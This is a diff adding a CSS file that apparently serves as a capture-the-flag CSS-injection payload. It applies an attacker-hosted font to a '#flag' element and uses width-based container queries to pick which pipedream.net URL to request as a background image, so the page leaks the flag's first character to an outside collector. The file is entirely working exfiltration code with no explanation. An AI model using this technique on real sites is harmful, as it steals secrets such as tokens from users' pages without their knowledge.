@@ -1,0 +1,17 @@
+body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=CQR0')}
+#page{content-visibility:hidden;animation:unveil 0.001s 0.3s forwards}
+@keyframes unveil{to{content-visibility:visible}}
+@font-face{font-family:cqp;src:url('https://uh4ck3r.github.io/ctf/cq_r0.woff2')}
+#flag{font-family:cqp;font-size:15px;display:block;width:max-content;container-type:inline-size;container-name:cqflag;white-space:pre}
+@container cqflag (min-width:60px) and (max-width:119px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_a')}}
+@container cqflag (min-width:120px) and (max-width:179px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_b')}}
+@container cqflag (min-width:180px) and (max-width:239px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_j')}}
+@container cqflag (min-width:240px) and (max-width:299px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_p')}}
+@container cqflag (min-width:300px) and (max-width:359px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_s')}}
+@container cqflag (min-width:360px) and (max-width:419px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_y')}}
+@container cqflag (min-width:420px) and (max-width:479px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_z')}}
+@container cqflag (min-width:480px) and (max-width:539px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_0')}}
+@container cqflag (min-width:540px) and (max-width:599px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_1')}}
+@container cqflag (min-width:600px) and (max-width:659px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_4')}}
+@container cqflag (min-width:660px) and (max-width:719px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_5')}}
+@container cqflag (min-width:720px) and (max-width:779px){body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_7')}}
